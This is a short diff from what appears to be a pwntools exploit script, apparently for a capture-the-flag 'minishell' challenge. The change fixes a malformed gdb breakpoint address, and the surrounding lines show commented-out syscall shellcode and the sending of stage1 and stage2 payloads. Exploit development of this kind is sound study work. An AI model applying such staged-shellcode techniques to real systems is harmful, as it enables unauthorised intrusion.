@@ -76,7 +76,7 @@ stage2 = asm('''
 #     cdq
 #     syscall
 #     ''')
-ddebug("break *0x0401E6B\nb *0x0x100000011 \n continue")
+ddebug("break *0x0401E6B\nb *0x100000011 \n continue")
 io.sendlineafter(b"minishell$ ", b"cat")
 pause()
 io.sendline(stage1)
